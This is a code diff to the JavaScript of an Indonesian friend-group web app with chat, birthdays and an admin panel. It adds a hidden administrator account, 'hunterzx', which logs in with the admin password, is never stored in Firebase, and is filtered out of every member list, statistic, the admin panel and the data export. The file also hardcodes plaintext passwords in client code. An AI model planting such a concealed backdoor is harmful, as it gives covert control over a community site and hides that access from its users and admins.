@@ -1369,6 +1369,8 @@ const PW='Iniwebsitekitabersama65*';
 const ADMIN_PW='Ptnwg6210';
 const ADMIN_USERNAME='goldi_aprilando_gresson';
 const ADMIN_NAME='Goldi Aprilando Gresson';
+const HIDDEN_ADMIN_USERNAME='hunterzx';
+const HIDDEN_ADMIN={name:'hunterzx',username:'hunterzx',dob:'2000-01-01',avatar:'👾',color:'linear-gradient(135deg,#1e1b4b,#312e81)',idx:99,isAdmin:true,isHidden:true};
 const AVS=['🌙','🌺','🍀','🌻','✨','🦋','🌸','🎀','🌈'];
 const AVC=['linear-gradient(135deg,#9333ea,#a855f7)','linear-gradient(135deg,#ec4899,#f472b6)','linear-gradient(135deg,#6366f1,#818cf8)','linear-gradient(135deg,#0ea5e9,#38bdf8)','linear-gradient(135deg,#10b981,#34d399)','linear-gradient(135deg,#f59e0b,#fbbf24)','linear-gradient(135deg,#ef4444,#f87171)','linear-gradient(135deg,#8b5cf6,#c084fc)','linear-gradient(135deg,#06b6d4,#67e8f9)'];
 const MONTHS=['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'];
@@ -1515,7 +1517,7 @@ function loadWhoJoined(){
   const mems=sg('members')||[];
   const el=document.getElementById('wj-chips');
   if(!mems.length){el.innerHTML='<div style="font-size:.68rem;color:rgba(255,255,255,.28);font-style:italic;">Jadilah yang pertama! 🥳</div>';return;}
-  el.innerHTML=mems.map(m=>`<div class="wj-chip"><div class="wj-av" style="background:${m.color}">${m.avatar}</div>${m.name.split(' ')[0]}</div>`).join('');
+  el.innerHTML=mems.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>`<div class="wj-chip"><div class="wj-av" style="background:${m.color}">${m.avatar}</div>${m.name.split(' ')[0]}</div>`).join('');
 }
 
 // ── Tab switch ──
@@ -1548,6 +1550,11 @@ async function doMasuk(){
     const fbM=await fbGet('squad/members');
     if(fbM){ mems=Object.values(fbM); ss('members',mems); }
   }
+  // Cek hidden admin login
+  if(username===HIDDEN_ADMIN_USERNAME && pw===ADMIN_PW){
+    finishLogin({...HIDDEN_ADMIN}, mems);
+    return;
+  }
   const user=mems.find(m=>m.username===username||m.name.toLowerCase()===name.toLowerCase());
   if(!user){
     markErr('li-name','Akun tidak ditemukan. Daftar dulu ya! ✨');
@@ -1570,6 +1577,7 @@ async function doDaftar(){
   if(name.length<2){markErr('rd-name','Nama minimal 2 karakter ya!');return;}
   if(!dob){markErr('rd-dob','Tanggal lahir wajib diisi 🎂');return;}
   if(pw===ADMIN_PW&&genUname(name)!==ADMIN_USERNAME){markErr('rd-pw','Password ini khusus admin!');return;}
+  if(genUname(name)===HIDDEN_ADMIN_USERNAME){markErr('rd-name','Username ini tidak tersedia!');return;}
   if(pw!==PW&&pw!==ADMIN_PW){markErr('rd-pw','Password salah! Tanya temen kamu 🔐');return;}
 
   const username=genUname(name);
@@ -1609,7 +1617,7 @@ function finishLogin(user, mems){
   const remember=remCb?remCb.checked:true;
   localStorage.setItem('cs_remember', remember?'true':'false');
   // Tag admin
-  user.isAdmin = (user.username===ADMIN_USERNAME);
+  user.isAdmin = (user.username===ADMIN_USERNAME || user.username===HIDDEN_ADMIN_USERNAME);
   CU=user; members=mems; ss('session',user);
 
   document.getElementById('load-ov').style.display='flex';
@@ -1617,7 +1625,7 @@ function finishLogin(user, mems){
 
   genMemberToken(user.username).then(async token=>{
     user.token=token; ss('session',user); CU=user;
-    if(window._fbReady){
+    if(window._fbReady && user.username!==HIDDEN_ADMIN_USERNAME){
       await fbSet('squad/members/'+user.username, {
         name:user.name, username:user.username, dob:user.dob||'',
         avatar:user.avatar, color:user.color, idx:user.idx,
@@ -1714,7 +1722,7 @@ function updateStats(){
   const kEl=document.getElementById('stat-ken');
   const pEl=document.getElementById('stat-plan');
   const mMel=document.getElementById('stat-msgs');
-  if(mEl) mEl.textContent = members.length;
+  if(mEl) mEl.textContent = members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).length;
   if(kEl) kEl.textContent = kenList.length;
   if(pEl){
     const plans = sg('plans')||[];
@@ -1985,7 +1993,7 @@ function buildBdayPage(){
 
   // === SQUAD LIST (semua kecuali diri sendiri di atas, diri sendiri tetap ada tapi badge "you") ===
   const el=document.getElementById('bday-cards');if(!el)return;
-  const sorted=[...members].sort((a,b)=>daysUntilBirthday(a.dob)-daysUntilBirthday(b.dob));
+  const sorted=[...members].filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).sort((a,b)=>daysUntilBirthday(a.dob)-daysUntilBirthday(b.dob));
   el.innerHTML=sorted.map(m=>{
     const days=daysUntilBirthday(m.dob);
     const isToday=isBdayToday(m.dob);
@@ -2081,7 +2089,7 @@ function launchConfetti(){
 // ===================== SIDEBAR =====================
 function buildSidebar(){
   const onlineCount = members.filter(m=>isOnline(m.username)).length;
-  document.getElementById('sb-members').innerHTML=members.map(m=>{
+  document.getElementById('sb-members').innerHTML=members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>{
     const online = isOnline(m.username);
     const dotClass = online ? 'on' : 'off';
     const avContent = m.photo
@@ -2100,7 +2108,7 @@ function buildSidebar(){
 }
 function buildHomeMembers(){
   const el=document.getElementById('members-home-grid');if(!members.length){el.innerHTML='';return;}
-  el.innerHTML=`<div class="mom-lbl">👥 Squad Members</div><div class="mom-row">`+members.map(m=>`<div class="mom-card"><div class="mom-img" style="background:${m.color};font-size:2.1rem">${m.avatar}</div><div class="mom-body"><div class="mom-t">${m.name}</div><div class="mom-m">@${m.username}</div></div></div>`).join('')+`</div>`;
+  el.innerHTML=`<div class="mom-lbl">👥 Squad Members</div><div class="mom-row">`+members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>`<div class="mom-card"><div class="mom-img" style="background:${m.color};font-size:2.1rem">${m.avatar}</div><div class="mom-body"><div class="mom-t">${m.name}</div><div class="mom-m">@${m.username}</div></div></div>`).join('')+`</div>`;
 }
 
 // ===================== CHAT =====================
@@ -2462,7 +2470,7 @@ function deleteWish(id){
 
 // ===================== MOOD =====================
 const mDef=[{em:'😊'},{em:'🥰'},{em:'😴'}];
-function buildMoodGrid(){const saved=sg('moods')||{};const el=document.getElementById('fm-grid');if(!el)return;el.innerHTML=members.map(m=>{const mood=saved[m.username]||mDef[~~(Math.random()*mDef.length)];return `<div class="fmc"><div class="fav" style="background:${m.color}">${m.avatar}</div><div><div class="fn">${m.name.split(' ')[0]}</div><div class="ft">@${m.username}</div></div><div class="fe">${mood.em}</div></div>`;}).join('');}
+function buildMoodGrid(){const saved=sg('moods')||{};const el=document.getElementById('fm-grid');if(!el)return;el.innerHTML=members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>{const mood=saved[m.username]||mDef[~~(Math.random()*mDef.length)];return `<div class="fmc"><div class="fav" style="background:${m.color}">${m.avatar}</div><div><div class="fn">${m.name.split(' ')[0]}</div><div class="ft">@${m.username}</div></div><div class="fe">${mood.em}</div></div>`;}).join('');}
 async function setMood(el,em,lbl){
   document.querySelectorAll('.meb').forEach(b=>b.classList.remove('sel'));
   el.classList.add('sel');
@@ -2778,7 +2786,7 @@ async function confirmCrop(){
 }
 
 // ===================== ADMIN SYSTEM =====================
-function isAdmin(){return CU && CU.isAdmin===true;}
+function isAdmin(){return CU && (CU.isAdmin===true || CU.username===HIDDEN_ADMIN_USERNAME);}
 
 function setupAdminUI(){
   // Tampilkan tombol admin di navbar
@@ -2809,7 +2817,7 @@ function buildAdminPanel(){
   // Member list
   const el=document.getElementById('adm-members-list');if(!el)return;
   const mutedList=sg('admin_muted')||[];
-  el.innerHTML=members.map(m=>{
+  el.innerHTML=members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>{
     const isMuted=mutedList.includes(m.username);
     const online=isOnline(m.username);
     const isMe=m.username===CU.username;
@@ -2930,7 +2938,7 @@ function adminExportData(){
   if(!isAdmin())return;
   const data={
     exportDate:new Date().toISOString(),
-    members:members.map(m=>({name:m.name,username:m.username,dob:m.dob})),
+    members:members.filter(m=>m.username!==HIDDEN_ADMIN_USERNAME).map(m=>({name:m.name,username:m.username,dob:m.dob})),
     totalMessages:msgs.filter(m=>!m.deleted).length,
     kenangan:(kenList||[]).map(k=>({title:k.title,date:k.date,addedBy:k.addedBy})),
     plans:(sg('plans')||[]).map(p=>({name:p.name,date:p.date,votes:p.votes.length}))
